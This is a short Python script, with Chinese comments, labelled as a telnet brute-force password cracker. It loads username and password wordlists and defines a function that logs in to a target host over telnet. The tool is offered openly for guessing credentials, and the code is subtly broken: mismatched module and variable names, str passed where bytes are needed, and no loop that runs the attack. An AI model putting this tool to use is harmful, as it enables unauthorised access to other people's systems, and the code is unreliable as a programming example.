#!/usr/bin/python3
import telnet 
import time

print("telnet 暴力破解")
print("[用法举例]:  ./pytelnet.py [user.txt] [password.txt]")

def file_list(filename):
    with open(filename,'r') as f:
        all=f.read()
        list=all.split("\n")
        del list[-1]
        list_num=len(list)
        if file_name == 'user.txt':
            global user_list,user_list_num
            user_list=list[:]
            user_list_num=list_num
        elif file_name == 'password.txt':
            global password_list,password_list_num
            password_list=list[:]
            password_list_num=list_num
        else:
            print("文件名错误！")
        f.close()
 
def login_telnet(username,password,host):
    tn=telnetlib.Telnet(host)
    tn.read_until('login:')
    tn.write(username+'\r\n')

    tn.read_until('password:')
    tn.write(password+'\r\n')

    for i in range(5):
        th.read_until('\n')
    global tmp
    tmp=tn.read_until('>')
    tn.close()

